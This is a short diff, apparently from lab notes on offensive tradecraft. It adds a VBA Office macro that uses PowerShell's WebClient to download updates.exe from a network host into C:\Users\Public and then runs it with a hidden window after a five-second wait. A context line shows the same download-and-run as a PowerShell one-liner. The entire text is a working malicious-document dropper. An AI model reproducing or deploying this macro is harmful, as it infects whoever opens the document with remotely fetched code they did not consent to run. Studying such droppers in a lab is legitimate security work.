@@ -13,3 +13,22 @@ End Sub
 
 powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.66.59/updates.exe',
 'C:\Users\Public\updates.exe');& 'C:\Users\Public\updates.exe'
+
+
+Sub MyMacro()
+  Dim str As String
+  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.243.131/updates.exe', 'C:\Users\Public\updates.exe')"
+  Shell str, vbHide
+  Dim exePath As String
+  exePath = "C:\Users\Public\updates.exe"
+  Wait (5)
+  Shell exePath, vbHide
+End Sub
+
+Sub Wait(n As Long)
+  Dim t As Date
+  t = Now
+  Do
+  DoEvents
+  Loop Until Now >= DateAdd("s", n, t)
+End Sub
